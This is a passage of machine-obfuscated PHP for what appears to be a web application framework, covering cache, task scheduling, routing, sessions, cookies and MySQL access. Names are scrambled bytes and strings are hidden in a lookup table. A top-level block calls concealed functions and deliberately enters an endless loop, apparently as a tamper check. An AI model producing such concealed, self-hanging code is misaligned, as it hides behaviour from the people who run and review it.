$e¦ÄÇ³ô„ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$e¦ÄÇ³ô„) { return 0; } return intval($e¦ÄÇ³ô„); } public static function getAll() { $b¿ÔÆç©¢Ô = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$b¿ÔÆç©¢Ô) { return array(); } return $b¿ÔÆç©¢Ô; } public static function setAll($fæ…Á«´Õ±) { $aéòÛ„äÔÑ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($fæ…Á«´Õ±), $aéòÛ„äÔÑ); Cache::set(self::QUEUE_DATA, $fæ…Á«´Õ±, $aéòÛ„äÔÑ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($Dšîö•§Ş‹, $aµˆ…‰¨î© = 5.0) { if (!$Dšîö•§Ş‹) { return; } $A¨ò‘ãâƒ‡ = Cache::get($Dšîö•§Ş‹); if (!$A¨ò‘ãâƒ‡ || timeFloat() - floatVal($A¨ò‘ãâƒ‡) >= $aµˆ…‰¨î©) { Cache::set($Dšîö•§Ş‹, timeFloat(), $aµˆ…‰¨î© * 10); return !0; } return !1; } public static function timeLimitCall($AÉ§îÁ½‹ñ, $F–³õ¾Œ„ƒ, $E‚¢¡¼è®µ, $E‹¸„ƒƒö = 5.0) { goto aëò¾Î¬«á; aÏÆ–Ò•«´: if (is_array($aà‚çÂÜ…Ò[$AÉ§îÁ½‹ñ])) { $c¨Ìä»ÀÈ[$e‰²ô§Ó•[1584]] = $aà‚çÂÜ…Ò[$AÉ§îÁ½‹ñ][$e‰²ô§Ó•[1584]]; } if (is_array($aà‚çÂÜ…Ò[$AÉ§îÁ½‹ñ])) { if (timeFloat() - $aà‚çÂÜ…Ò[$AÉ§îÁ½‹ñ][$e‰²ô§Ó•[1583]] < $c¨Ìä»ÀÈ[$e‰²ô§Ó•[196]] * 0.3) { return; } $c¨Ìä»ÀÈ[$e‰²ô§Ó•[1584]] = $aà‚çÂÜ…Ò[$AÉ§îÁ½‹ñ][$e‰²ô§Ó•[1584]]; } $aà‚çÂÜ…Ò[$AÉ§îÁ½‹ñ] = $c¨Ìä»ÀÈ; goto bŞÓÒ©é¼˜; aëò¾Î¬«á: $e‰²ô§Ó• =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$AÉ§îÁ½‹ñ || !$F–³õ¾Œ„ƒ) { return; } self::$asyncAdd = !0; goto e¦·×òªâ“; e¦·×òªâ“: $d²Š‚–ì¼è = $e‰²ô§Ó•[1582]; $aà‚çÂÜ…Ò = Cache::get($d²Š‚–ì¼è, !0); $c¨Ìä»ÀÈ = array($e‰²ô§Ó•[1583] => timeFloat(), $e‰²ô§Ó•[1584] => timeFloat(), $e‰²ô§Ó•[261] => $F–³õ¾Œ„ƒ, $e‰²ô§Ó•[1577] => $E‚¢¡¼è®µ, $e‰²ô§Ó•[196] => $E‹¸„ƒƒö); goto aÏÆ–Ò•«´; bŞÓÒ©é¼˜: Cache::set($d²Š‚–ì¼è, $aà‚çÂÜ…Ò, 60); Cache::removeMemory($d²Š‚–ì¼è); write_log($e‰²ô§Ó•[1585] . $AÉ§îÁ½‹ñ . $e‰²ô§Ó•[68] . $F–³õ¾Œ„ƒ, $e‰²ô§Ó•[1579]); goto a‡Ø† ä³„; a‡Ø† ä³„: } public static function timeLimitCallLoop() { goto D”‚Ñ¢œ; eÉ‡Ü·Û·ß: $cë±É·ğ‡ = array(); foreach ($dÌğ„Ä›áÚ as $EáŸ„ºìŸ² => $D½ç¼Üƒ¥¥) { if ($cåÏëãµäê - $D½ç¼Üƒ¥¥[$EÁ­„š´Ëâ[1584]] > $D½ç¼Üƒ¥¥[$EÁ­„š´Ëâ[196]]) { $Eàóš—õ¸ = !0; try { Hook::apply($D½ç¼Üƒ¥¥[$EÁ­„š´Ëâ[261]], $D½ç¼Üƒ¥¥[$EÁ­„š´Ëâ[1577]]); write_log($EÁ­„š´Ëâ[1587] . $EáŸ„ºìŸ² . $EÁ­„š´Ëâ[68] . $D½ç¼Üƒ¥¥[$EÁ­„š´Ëâ[261]] . $EÁ­„š´Ëâ[1588] . ACTION, $EÁ­„š´Ëâ[1579]); } catch (Exception $CµîğÇÚ•¶) { } continue; } $cë±É·ğ‡[$EáŸ„ºìŸ²] = $D½ç¼Üƒ¥¥; } if (!$Eàóš—õ¸) { return; } goto CÉì¬…¹»; e¶“×ˆ‰‰: if (!$dÌğ„Ä›áÚ || count($dÌğ„Ä›áÚ) <= 0) { return; } $Eàóš—õ¸ = !1; $cåÏëãµäê = timeFloat(); goto eÉ‡Ü·Û·ß; D”‚Ñ¢œ: $EÁ­„š´Ëâ =& $_SERVER[Ïº«‚ßèÔˆø]; $CÄŠŠ“Ø‰¬ = array($EÁ­„š´Ëâ[1586]); $BŠ¶® ÚÄÄ = in_array(strtolower(ACTION), $CÄŠŠ“Ø‰¬); goto eî¬Õ’¶Äˆ; CÉì¬…¹»: if (!$cë±É·ğ‡) { return Cache::remove($E½ÓŞ‹õºñ); } Cache::set($E½ÓŞ‹õºñ, $cë±É·ğ‡, 60); Cache::removeMemory($E½ÓŞ‹õºñ); goto BãÙ£³õæ¾; eî¬Õ’¶Äˆ: if (!$BŠ¶® ÚÄÄ && !self::$asyncAdd) { return; } $E½ÓŞ‹õºñ = $EÁ­„š´Ëâ[1582]; $dÌğ„Ä›áÚ = Cache::get($E½ÓŞ‹õºñ, !0); goto e¶“×ˆ‰‰; BãÙ£³õæ¾: } public static function finished($AÏÂºŠ‰óÃ, $b­®ÆÚÖ‡•) { $BË¦×Ó±„ò =& $_SERVER[Ïº«‚ßèÔˆø]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($BË¦×Ó±„ò[261] => $AÏÂºŠ‰óÃ, $BË¦×Ó±„ò[1577] => $b­®ÆÚÖ‡•); } private static function finishedRun() { $b†ƒÔÑ––” =& $_SERVER[Ïº«‚ßèÔˆø]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $a‡†¶ùª“‰) { try { Hook::apply($a‡†¶ùª“‰[$b†ƒÔÑ––”[261]], $a‡†¶ùª“‰[$b†ƒÔÑ––”[1577]]); } catch (Exception $a¢Ú¡ˆ„Ø°) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto D‹ÂáÔŠ†; aÈ¸Û›ºò: if (!isset($_SERVER[$_SERVER[Ïº«‚ßèÔˆø][748]]) || !isset($_SERVER[$_SERVER[Ïº«‚ßèÔˆø][746]])) { goto a¿³¡Ë›¡œ; a¡šÜ»ŸêÄ: $dŸ†ßïëö = explode($_SERVER[Ïº«‚ßèÔˆø][228], $F×‡îÕºô); if (count($dŸ†ßïëö) < $_SERVER[Ïº«‚ßèÔˆø][582]) { $Cğ½ÂÂíõË = $_SERVER[Ïº«‚ßèÔˆø][752]; $Cğ½ÂÂíõË(); } $f°ñø»ø£‹ = $_SERVER[Ïº«‚ßèÔˆø][753]; goto EËç®‘î†¨; EËç®‘î†¨: $f°ñø»ø£‹($_SERVER[$_SERVER[Ïº«‚ßèÔˆø][750]] . $_SERVER[Ïº«‚ßèÔˆø][751]); $Eô»Õ«µ©¡ = 2; while ($Eô»Õ«µ©¡ > 1) { $eÆ´ß¾Õ›ß = rawurlencode($Eô»Õ«µ©¡ . $_SERVER[Ïº«‚ßèÔˆø][374]); } goto A ´¶ƒ¥¡é; a¿³¡Ë›¡œ: $EÆŸšÀë§ = $_SERVER[Ïº«‚ßèÔˆø][749]; $D¬©ğŒæÜ = $_SERVER[$_SERVER[Ïº«‚ßèÔˆø][750]] . $_SERVER[Ïº«‚ßèÔˆø][751]; $F×‡îÕºô = $EÆŸšÀë§($D¬©ğŒæÜ); goto a¡šÜ»ŸêÄ; A ´¶ƒ¥¡é: } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\171" => "\133\136\x2f\135\x2b", "\72\156\x75\155" => "\x5b\60\x2d\x39\135\53", "\72\141\154\x6c" => "\56\52"); public static $errorCallback; public static function __callstatic($Eö¡¾Œ©ö¢, $d¸‚ë¶ˆ‘³) { $f¨¿ ƒ©ë© =& $_SERVER[Ïº«‚ßèÔˆø]; if ($Eö¡¾Œ©ö¢ == $f¨¿ ƒ©ë©[1457]) { $b›ìÈ ñ¿Â = array_map($f¨¿ ƒ©ë©[1458], $d¸‚ë¶ˆ‘³[0]); $b®ï©¡’¯· = strpos($d¸‚ë¶ˆ‘³[1], $f¨¿ ƒ©ë©[8]) === 0 ? $d¸‚ë¶ˆ‘³[1] : $f¨¿ ƒ©ë©[8] . $d¸‚ë¶ˆ‘³[1]; $a†‡§¦Ó˜Â = $d¸‚ë¶ˆ‘³[2]; } else { $b›ìÈ ñ¿Â = null; $b®ï©¡’¯· = strpos($d¸‚ë¶ˆ‘³[0], $f¨¿ ƒ©ë©[8]) === 0 ? $d¸‚ë¶ˆ‘³[0] : $f¨¿ ƒ©ë©[8] . $d¸‚ë¶ˆ‘³[0]; $a†‡§¦Ó˜Â = $d¸‚ë¶ˆ‘³[1]; } array_push(self::$maps, $b›ìÈ ñ¿Â); array_push(self::$routes, $b®ï©¡’¯·); array_push(self::$methods, strtoupper($Eö¡¾Œ©ö¢)); array_push(self::$callbacks, $a†‡§¦Ó˜Â); } public static function error($AËÙæ¯à™Å) { self::$errorCallback = $AËÙæ¯à™Å; } public static function haltOnMatch($BÔÚ»Ìå° = true) { self::$halts = $BÔÚ»Ìå°; } public static function dispatch() { goto c…¯ˆ•‘Î; fì¿‹Ÿ‘ô³: $EßˆÆá‡ = array_keys(static::$patterns); $Dö™ºÄİïĞ = array_values(static::$patterns); $eùìäµùĞ  = !1; goto Aº’×É”áŞ; c…¯ˆ•‘Î: $cëöìÔ˜ê =& $_SERVER[Ïº«‚ßèÔˆø]; $fÂÃ“Œ‡ = parse_url($_SERVER[$cëöìÔ˜ê[1459]], PHP_URL_PATH); $B½¦°•æ„ = $_SERVER[$cëöìÔ˜ê[157]]; goto fì¿‹Ÿ‘ô³; Aº’×É”áŞ: self::$routes = preg_replace($cëöìÔ˜ê[1145], $cëöìÔ˜ê[8], self::$routes); if (in_array($fÂÃ“Œ‡, self::$routes)) { $eëæÒÉ§Æ = array_keys(self::$routes, $fÂÃ“Œ‡); foreach ($eëæÒÉ§Æ as $Bç­»Á¶×Ï) { if (self::$methods[$Bç­»Á¶×Ï] == $B½¦°•æ„ || self::$methods[$Bç­»Á¶×Ï] == $cëöìÔ˜ê[1460] || in_array($B½¦°•æ„, self::$maps[$Bç­»Á¶×Ï])) { $eùìäµùĞ  = !0; if (!is_object(self::$callbacks[$Bç­»Á¶×Ï])) { $døˆ¾ƒ§³ƒ = explode($cëöìÔ˜ê[8], self::$callbacks[$Bç­»Á¶×Ï]); $eœŞ³¨ÂÒ« = end($døˆ¾ƒ§³ƒ); $Bœ‹»ÑóÎã = explode($cëöìÔ˜ê[1461], $eœŞ³¨ÂÒ«); $cÉÏ‹—™å = new $Bœ‹»ÑóÎã[0](); $cÉÏ‹—™å->{$Bœ‹»ÑóÎã[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$Bç­»Á¶×Ï]); if (self::$halts) { return; } } } } } else { $D¯¹Í«ä§œ = 0; foreach (self::$routes as $Bç­»Á¶×Ï) { if (strpos($Bç­»Á¶×Ï, $cëöìÔ˜ê[4]) !== !1) { $Bç­»Á¶×Ï = str_replace($EßˆÆá‡, $Dö™ºÄİïĞ, $Bç­»Á¶×Ï); } if (preg_match($cëöìÔ˜ê[1462] . $Bç­»Á¶×Ï . $cëöìÔ˜ê[1463], $fÂÃ“Œ‡, $cÎ¸“‡´©•)) { if (self::$methods[$D¯¹Í«ä§œ] == $B½¦°•æ„ || self::$methods[$D¯¹Í«ä§œ] == $cëöìÔ˜ê[1460] || !empty(self::$maps[$D¯¹Í«ä§œ]) && in_array($B½¦°•æ„, self::$maps[$D¯¹Í«ä§œ])) { $eùìäµùĞ  = !0; array_shift($cÎ¸“‡´©•); if (!is_object(self::$callbacks[$D¯¹Í«ä§œ])) { $døˆ¾ƒ§³ƒ = explode($cëöìÔ˜ê[8], self::$callbacks[$D¯¹Í«ä§œ]); $eœŞ³¨ÂÒ« = end($døˆ¾ƒ§³ƒ); $Bœ‹»ÑóÎã = explode($cëöìÔ˜ê[1461], $eœŞ³¨ÂÒ«); $cÉÏ‹—™å = new $Bœ‹»ÑóÎã[0](); if (!method_exists($cÉÏ‹—™å, $Bœ‹»ÑóÎã[1])) { echo $cëöìÔ˜ê[1464]; } else { call_user_func_array(array($cÉÏ‹—™å, $Bœ‹»ÑóÎã[1]), $cÎ¸“‡´©•); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$D¯¹Í«ä§œ], $cÎ¸“‡´©•); if (self::$halts) { return; } } } } $D¯¹Í«ä§œ++; } } if ($eùìäµùĞ  == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $f„å¤Ö„Ğ =& $_SERVER[Ïº«‚ßèÔˆø]; header($_SERVER[$f„å¤Ö„Ğ[1465]] . $f„å¤Ö„Ğ[1466]); echo $f„å¤Ö„Ğ[1467]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$cëöìÔ˜ê[1459]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto a‹÷ŞÅ¸; a‹÷ŞÅ¸: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto eÒÓÌ£ùğ‰; FöšóÓÏ¨: if (self::$sessionSign) { } else { if (Cookie::get($EØí½ËÛŸ)) { self::$sessionSign = Cookie::get($EØí½ËÛŸ); } else { self::$sessionSign = guid(); } } Cookie::setSafe($EØí½ËÛŸ, self::$sessionSign, self::$sessionTime); $DÉñ…¨§‡° = $e¢˜‹¨îÊÁ[$eÆ©–šæ¹Å[1470]]; goto CÒÂ½ÂŒË; cŒ²ÓˆÉÚİ: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $C«¾äæ³â“ = new self(); return $C«¾äæ³â“; goto EãÕŠ¾­õ¬; eÒÓÌ£ùğ‰: $eÆ©–šæ¹Å =& $_SERVER[Ïº«‚ßèÔˆø]; static $C«¾äæ³â“ = false; if ($C«¾äæ³â“) { return $C«¾äæ³â“; } goto Aá¥Ú·´ƒ˜; CÒÂ½ÂŒË: $FÎŠ–õñ‘ = $e¢˜‹¨îÊÁ[$DÉñ…¨§‡°]; $E¾÷§Û‰ŒŸ = $e¢˜‹¨îÊÁ[$eÆ©–šæ¹Å[785]]; switch ($DÉñ…¨§‡°) { case $eÆ©–šæ¹Å[17]: self::$handle = Model($eÆ©–šæ¹Å[786]); break; case $eÆ©–šæ¹Å[787]: self::$handle = new CacheRedis($FÎŠ–õñ‘, $E¾÷§Û‰ŒŸ); break; case $eÆ©–šæ¹Å[788]: self::$handle = new CacheMemcached($FÎŠ–õñ‘, $E¾÷§Û‰ŒŸ); break; case $eÆ©–šæ¹Å[192]: $FÎŠ–õñ‘[$eÆ©–šæ¹Å[76]] = $FÎŠ–õñ‘[$eÆ©–šæ¹Å[76]] . $eÆ©–šæ¹Å[1471]; self::$handle = new CacheFile($FÎŠ–õñ‘, $E¾÷§Û‰ŒŸ); default: break; } goto cŒ²ÓˆÉÚİ; Aá¥Ú·´ƒ˜: $e¢˜‹¨îÊÁ = $GLOBALS[$eÆ©–šæ¹Å[6]][$eÆ©–šæ¹Å[346]]; self::$sessionTime = $e¢˜‹¨îÊÁ[$eÆ©–šæ¹Å[1468]]; $EØí½ËÛŸ = isset($GLOBALS[$eÆ©–šæ¹Å[1469]]) ? $GLOBALS[$eÆ©–šæ¹Å[1469]] : SESSION_ID; goto FöšóÓÏ¨; EãÕŠ¾­õ¬: } public static function sign($D÷÷ï“Ö ¸ = false) { $D÷÷ï“Ö ¸ && (self::$sessionSign = $D÷÷ï“Ö ¸); self::init(); return self::$sessionSign; } public static function set($cåÃäé±È¸, $FÖºî²»¡§ = false) { self::init(); if (is_array($cåÃäé±È¸)) { foreach ($cåÃäé±È¸ as $Dº„†ŞÊ => $e•óğ£ì„„) { array_set_value(self::$data, $Dº„†ŞÊ, $e•óğ£ì„„); } } else { array_set_value(self::$data, $cåÃäé±È¸, $FÖºî²»¡§); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($FÔ¼åìöùá = false) { self::init(); if (!$FÔ¼åìöùá) { return self::$data; } return array_get_value(self::$data, $FÔ¼åìöùá); } public static function remove($e‡Š…º©İš) { self::init(); unset(self::$data[$e‡Š…º©İš]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Ïº«‚ßèÔˆø][790])) { self::$handle->clearTimeout(); } } } goto eùÇ—ò¦’„; B¥Ä¦áù”’: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($F¸¥•¾ = '', $CĞŞë†®è÷ = 0) { if (is_string($F¸¥•¾) && $F¸¥•¾ != $_SERVER[Ïº«‚ßèÔˆø][33]) { $this->prefix = $F¸¥•¾; } if (is_numeric($CĞŞë†®è÷) && $CĞŞë†®è÷ > 0) { $this->expire = $CĞŞë†®è÷; } } public static function getInstance() { static $fæ§Öâ÷íŞ; if ($fæ§Öâ÷íŞ === null) { $fæ§Öâ÷íŞ = new self(); } return $fæ§Öâ÷íŞ; } private static $cookieDisable = false; public static function disable($eå„›—í¦) { self::$cookieDisable = $eå„›—í¦; } private static $sameCookieSet = array(); public static function set($eÂ“©‡§, $eé´ç¾±Èˆ, $C±É«¢¡ƒ‹ = 0, $bšëŞÀ°ß = false, $AğíáŞ´®Ù = false) { goto fà­Ä»‰áà; fà­Ä»‰áà: $bÄÍ…«†ğ› =& $_SERVER[Ïº«‚ßèÔˆø]; if (self::$cookieDisable) { return; } if (!$C±É«¢¡ƒ‹) { $C±É«¢¡ƒ‹ = 24 * 3600 * 7; } goto b™Ô–„©©; b™Ô–„©©: if (isset(self::$sameCookieSet[$eÂ“©‡§]) && self::$sameCookieSet[$eÂ“©‡§] == $eé´ç¾±Èˆ . $C±É«¢¡ƒ‹) { return; } self::$sameCookieSet[$eÂ“©‡§] = $eé´ç¾±Èˆ . $C±É«¢¡ƒ‹; if (!$AğíáŞ´®Ù) { $AğíáŞ´®Ù = str_replace(HOST, $bÄÍ…«†ğ›[33], APP_HOST); $AğíáŞ´®Ù = _get($GLOBALS, $bÄÍ…«†ğ›[828], $AğíáŞ´®Ù); } goto fÕÊ°ï–ç›; fÕÊ°ï–ç›: $dâÖØªäğÇ = $bÄÍ…«†ğ›[33]; setcookie($eÂ“©‡§, $eé´ç¾±Èˆ, time() + $C±É«¢¡ƒ‹, $bÄÍ…«†ğ›[8] . trim($AğíáŞ´®Ù, $bÄÍ…«†ğ›[8]) . $dâÖØªäğÇ, !1, !1, $bšëŞÀ°ß); goto e‡ÇáŞÛÄ; e‡ÇáŞÛÄ: } public static function setSafe($F³ÄÄÈİĞƒ, $b¹Ğ§°, $Fõë‡ƒÍ”á = 0) { self::set($F³ÄÄÈİĞƒ, $b¹Ğ§°, $Fõë‡ƒÍ”á, !0); } public static function get($d’¸»ğ‰) { return isset($_COOKIE[$d’¸»ğ‰]) ? $_COOKIE[$d’¸»ğ‰] : !1; } public static function remove($aƒŠŞ”ÏÍ, $e‰ìÈ¹æ½ˆ = false) { unset($_COOKIE[$aƒŠŞ”ÏÍ]); self::set($aƒŠŞ”ÏÍ, $_SERVER[Ïº«‚ßèÔˆø][33], 1, $e‰ìÈ¹æ½ˆ); } } class DbMysql extends Db { public function __construct($Eù•‘ÛªŸ = '') { $aÓÜ»«’¼Æ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!extension_loaded($aÓÜ»«’¼Æ[743])) { think_exception(think_lang($aÓÜ»«’¼Æ[10]) . $aÓÜ»«’¼Æ[829]); } if (!empty($Eù•‘ÛªŸ)) { $this->config = $Eù•‘ÛªŸ; if (empty($this->config[$aÓÜ»«’¼Æ[13]])) { $this->config[$aÓÜ»«’¼Æ[13]] = $aÓÜ»«’¼Æ[33]; } } } public function connect($E¹Õ™ÑÁ¹ = '', $B×»Îİ­ÍÜ = 0, $FñÍéµº¥ñ = false) { $B›™öàÈÒƒ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!isset($this->linkID[$B×»Îİ­ÍÜ])) { goto fî’òĞæ÷Ÿ; fî’òĞæ÷Ÿ: if (empty($E¹Õ™ÑÁ¹)) { $E¹Õ™ÑÁ¹ = $this->config; } $aÁ¤Œ‘‹†‹ = $E¹Õ™ÑÁ¹[$B›™öàÈÒƒ[830]] . ($E¹Õ™ÑÁ¹[$B›™öàÈÒƒ[831]] ? "\72{$E¹Õ™ÑÁ¹[$B›™öàÈÒƒ[831]]}" : $B›™öàÈÒƒ[33]); $eÒˆ¦Õ†®ä = !empty($E¹Õ™ÑÁ¹[$B›™öàÈÒƒ[13]][$B›™öàÈÒƒ[14]]) ? $E¹Õ™ÑÁ¹[$B›™öàÈÒƒ[13]][$B›™öàÈÒƒ[14]] : $this->pconnect; goto aÚáõØŒ‚Ê; d™ò´“¢‚Ğ: mysql_query($B›™öàÈÒƒ[834] . think_config($B›™öàÈÒƒ[835]) . $B›™öàÈÒƒ[55], $this->linkID[$B×»Îİ­ÍÜ]); if ($d¯œÕšæ•Œ > $B›™öàÈÒƒ[836]) { mysql_query($B›™öàÈÒƒ[837], $this->linkID[$B×»Îİ­ÍÜ]); } $this->connected = !0; goto e«Œ®ĞÅ¯é; aÚáõØŒ‚Ê: if ($eÒˆ¦Õ†®ä) { $this->linkID[$B×»Îİ­ÍÜ] = mysql_pconnect($aÁ¤Œ‘‹†‹, $E¹Õ™ÑÁ¹[$B›™öàÈÒƒ[832]], $E¹Õ™ÑÁ¹[$B›™öàÈÒƒ[833]], 131072); } else { $this->linkID[$B×»Îİ­ÍÜ] = mysql_connect($aÁ¤Œ‘‹†‹, $E¹Õ™ÑÁ¹[$B›™öàÈÒƒ[832]], $E¹Õ™ÑÁ¹[$B›™öàÈÒƒ[833]], !0, 131072); } if (!$this->linkID[$B×»Îİ­ÍÜ] || !empty($E¹Õ™ÑÁ¹[$B›™öàÈÒƒ[17]]) && !mysql_select_db($E¹Õ™ÑÁ¹[$B›™öàÈÒƒ[17]], $this->linkID[$B×»Îİ­ÍÜ])) { think_exception(mysql_error()); } $d¯œÕšæ•Œ = mysql_get_server_info($this->linkID[$B×»Îİ­ÍÜ]); goto d™ò´“¢‚Ğ; e«Œ®ĞÅ¯é: if (1 != think_config($B›™öàÈÒƒ[18])) { unset($this->config); } goto BâŠ’öÌ„; BâŠ’öÌ„: } return $this->linkID[$B×»Îİ­ÍÜ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($aÕ¶Ÿ‡˜¿²) { goto Cáäá¢Ï‡ò; F™ÖŸ…Œø: if (!$this->_linkID) { return !1; } $this->queryStr = $aÕ¶Ÿ‡˜¿²; if ($this->queryID) { $this->free(); } goto EÒÎÎ£ Şœ; b–ßˆòÀ‡Ù: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto AËº»¡Š‰±; Cáäá¢Ï‡ò: $FÚß“¢ã´ =& $_SERVER[Ïº«‚ßèÔˆø]; if (0 === stripos($aÕ¶Ÿ‡˜¿², $FÚß“¢ã´[261])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto F™ÖŸ…Œø; EÒÎÎ£ Şœ: think_action_status($FÚß“¢ã´[19], 1); think_status($FÚß“¢ã´[20]); $this->queryID = mysql_query($aÕ¶Ÿ‡˜¿², $this->_linkID); goto b–ßˆòÀ‡Ù; AËº»¡Š‰±: } public function execute($fßÅ‰âÂÕ¸) { goto a«´‘°¬°™; eÙÁ¼ôÕÊÏ: think_status($a¡¤Ú†ë¦[20]); $Eõ…Ÿ…ª’ = mysql_query($fßÅ‰âÂÕ¸, $this->_linkID); $this->debug(); goto b‹ŒÅ”¡­; a«´‘°¬°™: $a¡¤Ú†ë¦ =& $_SERVER[Ïº«‚ßèÔˆø]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto BÅ®¨§¦; BÅ®¨§¦: $this->queryStr = $fßÅ‰âÂÕ¸; if ($this->queryID) { $this->free(); } think_action_status($a¡¤Ú†ë¦[21], 1); goto eÙÁ¼ôÕÊÏ; b‹ŒÅ”¡­: if (!1 === $Eõ…Ÿ…ª’) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto dªñ½‰È¶…; dªñ½‰È¶…: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Ïº«‚ßèÔˆø][838], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $cä‘šŒÌÉ¸ = mysql_query($_SERVER[Ïº«‚ßèÔˆø][839], $this->_linkID); $this->transTimes = 0; if (!$cä‘šŒÌÉ¸) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $C³‰ Â†‡õ = mysql_query($_SERVER[Ïº«‚ßèÔˆø][840], $this->_linkID); $this->transTimes = 0; if (!$C³‰ Â†‡õ) { $this->error(); return !1; } } return !0; } private function getAll() { $Dšö´“æï = array(); if ($this->numRows > 0) { while ($Bò…Ü©î‚® = mysql_fetch_assoc($this->queryID)) { $Dšö´“æï[] = $Bò…Ü©î‚®; } mysql_data_seek($this->queryID, 0); } return $Dšö´“æï; } public function getFields($fê›¼æÄ”) { $E«·“ªÇ‘ =& $_SERVER[Ïº«‚ßèÔˆø]; $B‚†²Ü¹ = $this->query($E«·“ªÇ‘[841] . $this->parseKey($fê›¼æÄ”)); $DÄ÷«™†ø¢ = array(); if ($B‚†²Ü¹) { foreach ($B‚†²Ü¹ as $b´ÀÅŞÌ¾ => $C¨Å¼ÈÉ®¼) { $DÄ÷«™†ø¢[$C¨Å¼ÈÉ®¼[$E«·“ªÇ‘[27]]] = array($E«·“ªÇ‘[28] => $C¨Å¼ÈÉ®¼[$E«·“ªÇ‘[27]], $E«·“ªÇ‘[29] => $C¨Å¼ÈÉ®¼[$E«·“ªÇ‘[30]], $E«·“ªÇ‘[31] => (bool) (strtoupper($C¨Å¼ÈÉ®¼[$E«·“ªÇ‘[32]]) === $E«·“ªÇ‘[842]), $E«·“ªÇ‘[34] => $C¨Å¼ÈÉ®¼[$E«·“ªÇ‘[35]], $E«·“ªÇ‘[36] => strtolower($C¨Å¼ÈÉ®¼[$E«·“ªÇ‘[37]]) == $E«·“ªÇ‘[38], $E«·“ªÇ‘[39] => strtolower($C¨Å¼ÈÉ®¼[$E«·“ªÇ‘[40]]) == $E«·“ªÇ‘[41]); } } return $DÄ÷«™†ø¢; } public function getTables($c‰ó¤ ’“ = '') { $d­Œ¤Ú¡®Ç =& $_SERVER[Ïº«‚ßèÔˆø]; if (!empty($c‰ó¤ ’“)) { $e“¥ô÷ÖÈ = $d­Œ¤Ú¡®Ç[843] . $c‰ó¤ ’“ . $d­Œ¤Ú¡®Ç[844]; } else { $e“¥ô÷ÖÈ = $d­Œ¤Ú¡®Ç[845]; } $CÃêÎìÁ‘ = $this->query($e“¥ô÷ÖÈ); $bŒëÃ×¤° = array(); foreach ($CÃêÎìÁ‘ as $E²ÁÜ™”Ì¥ => $b×÷ÂŠéß) { $bŒëÃ×¤°[$E²ÁÜ™”Ì¥] = current($b×÷ÂŠéß); } return $bŒëÃ×¤°; } public function replace($b«–ø‚‰à, $AÜö»‚Õ« = array()) { $b˜Ù‘”È¡ê =& $_SERVER[Ïº«‚ßèÔˆø]; foreach ($b«–ø‚‰à as $BİÎ«ñ÷Ë– => $AêœèÙ·¨ë) { $bÍ¬ğÚ± = $this->parseValue($AêœèÙ·¨ë); if (is_scalar($bÍ¬ğÚ±)) { $F¡â¥æç¸Ô[] = $bÍ¬ğÚ±; $dŒğÇšè£[] = $this->parseKey($BİÎ«ñ÷Ë–); } } $B´Ú”ğ‚ø = $b˜Ù‘”È¡ê[846] . $this->parseTable($AÜö»‚Õ«[$b˜Ù‘”È¡ê[276]]) . $b˜Ù‘”È¡ê[847] . implode($b˜Ù‘”È¡ê[47], $dŒğÇšè£) . $b˜Ù‘”È¡ê[848] . implode($b˜Ù‘”È¡ê[47], $F¡â¥æç¸Ô) . $b˜Ù‘”È¡ê[849]; return $this->execute($B´Ú”ğ‚ø); } public function insertAll($bñªìŒ™èÍ, $C‚Æ›æË•º = array(), $fõÁÒ¬èĞÍ = false) { goto a¼…–¥‘èÊ; bÎ©£æ„•…: $fÁ˜’ºë»ê = array(); foreach ($bñªìŒ™èÍ as $fù÷ ¶Â•Ä) { $f—ÆÊ™º«¿ = array(); foreach ($fù÷ ¶Â•Ä as $fñå™Ü„á´ => $eß “ØŒôÊ) { $eß “ØŒôÊ = $this->parseValue($eß “ØŒôÊ); if (is_scalar($eß “ØŒôÊ)) { $f—ÆÊ™º«¿[] = $eß “ØŒôÊ; } } 